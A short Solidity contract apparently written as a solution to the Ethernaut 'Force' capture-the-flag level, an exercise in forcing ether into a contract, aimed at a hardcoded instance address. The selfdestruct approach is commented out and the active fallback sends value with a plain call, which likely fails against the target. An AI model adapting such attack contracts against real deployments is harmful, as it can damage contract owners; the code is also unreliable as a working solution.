// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "ethernaut/Force/Force.sol";

contract ForceAttack {
    Force instance = Force(0x23f27a4F6d21c1e81cEb6b08733D2fD838a56775);

    fallback() external payable {
        // selfdestruct(payable(address(instance)));
        (bool result, ) = address(instance).call{value: msg.value}("");
        require(result, "Failed to transfer to instance.");
    }
}
